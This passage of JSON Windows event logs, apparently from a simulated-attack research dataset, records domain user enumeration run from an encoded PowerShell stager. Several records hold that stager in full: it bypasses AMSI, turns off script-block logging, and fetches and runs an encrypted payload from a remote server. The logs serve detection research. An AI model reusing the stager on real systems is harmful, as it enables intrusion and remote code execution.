{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-7464-0F856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.903Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163832,"Payload":"CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"net user /domain\"\r\nCommandInvocation(Out-String): \"Out-String\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"The request will be processed at a domain controller for domain theshire.local.\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"User accounts for \\\\MORDORDC.theshire.local\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"-------------------------------------------------------------------------------\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"dschrute                 Guest                    krbtgt                   \"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"lrodriguez               mscott                   nmartha                  \"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"pbeesly                  pgustavo                 sbeavers                 \"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"sysmonsvc                wardog                   \"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"The command completed successfully.\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = Invoke-Expression\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16299\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:37","EventReceivedTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.906Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230295,"SourceProcessId":"908","SourceThreadId":"4484","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:35:37.127","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:37","Message":"Pipeline execution details for command line:         $IV = [byte] 0..255 | Get-Random -count 16\n. \r\n\r\nContext Information: \r\n\tDetailSequence=2\r\n\tDetailTotal=2\r\n\r\n\tSequenceNumber=16304\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=        $IV = [byte] 0..255 | Get-Random -count 16\n \r\n\r\nDetails: \r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"254\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"255\"\r\n","@timestamp":"2020-09-21T23:35:37.907Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":185119,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-DBFC-0B856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.907Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163833,"Payload":"CommandInvocation(Format-Table): \"Format-Table\"\r\nParameterBinding(Format-Table): name=\"Wrap\"; value=\"True\"\r\nCommandInvocation(Out-String): \"Out-String\"\r\nParameterBinding(Format-Table): name=\"InputObject\"; value=\"The request will be processed at a domain controller for domain theshire.local.\r\n\r\n\r\nUser accounts for \\\\MORDORDC.theshire.local\r\n\r\n-------------------------------------------------------------------------------\r\ndschrute                 Guest                    krbtgt                   \r\nlrodriguez               mscott                   nmartha                  \r\npbeesly                  pgustavo                 sbeavers                 \r\nsysmonsvc                wardog                   \r\nThe command completed successfully.\r\n\r\n\n\r..Command execution completed.\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAF